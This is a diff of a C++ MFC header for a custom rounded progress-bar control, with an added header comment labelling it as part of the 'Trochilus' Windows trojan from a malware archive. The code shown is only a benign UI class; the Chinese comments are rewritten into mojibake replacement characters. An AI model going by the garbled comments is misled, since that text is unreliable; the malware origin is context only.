@@ -1,12 +1,23 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
 
 
 // CColorProgressCtrl
 /*
-	×÷Õß£ºToTo
+	ï¿½ï¿½ï¿½ß£ï¿½ToTo
 	QQ:27459870
 	Web:http://www.ecjtu.org/forum
-	ÈÕÆÚ:2008/12/31
+	ï¿½ï¿½ï¿½ï¿½:2008/12/31
 */
 
 class CColorProgressCtrl : public CProgressCtrl
@@ -20,22 +31,22 @@ public:
 protected:
 	DECLARE_MESSAGE_MAP()
 public:
-	//ÉèÖÃ·¶Î§
+	//ï¿½ï¿½ï¿½Ã·ï¿½Î§
 	void SetRange(short nLower, short nUpper);
-	//ÉèÖÃÎ»ÖÃ
+	//ï¿½ï¿½ï¿½ï¿½Î»ï¿½ï¿½
 	void SetPos(int nPos);
-	//ÉèÖÃÑÕÉ«
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½É«
 	void SetColor(COLORREF roundRectColor, COLORREF progressColor);
-	//ÉèÖÃ»¡¶È
+	//ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½
 	void SetRadin(CPoint radin);
 private:
-	COLORREF m_roundRectColor;	//±ß¿òÉ«
-	COLORREF m_progressColor;	//½ø¶ÈÉ«
-	short m_nLower;				//ÏÂÏÞ
-	short m_nUpper;				//ÉÏÏÞ
-	CRect m_wndRect;			//½ø¶ÈÌõ´óÐ¡
-	short m_nPos;				//µ±Ç°Î»ÖÃ
-	CPoint m_radin;				//»¡¶È
+	COLORREF m_roundRectColor;	//ï¿½ß¿ï¿½É«
+	COLORREF m_progressColor;	//ï¿½ï¿½ï¿½ï¿½É«
+	short m_nLower;				//ï¿½ï¿½ï¿½ï¿½
+	short m_nUpper;				//ï¿½ï¿½ï¿½ï¿½
+	CRect m_wndRect;			//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð¡
+	short m_nPos;				//ï¿½ï¿½Ç°Î»ï¿½ï¿½
+	CPoint m_radin;				//ï¿½ï¿½ï¿½ï¿½
 	afx_msg void OnPaint();
 };
 
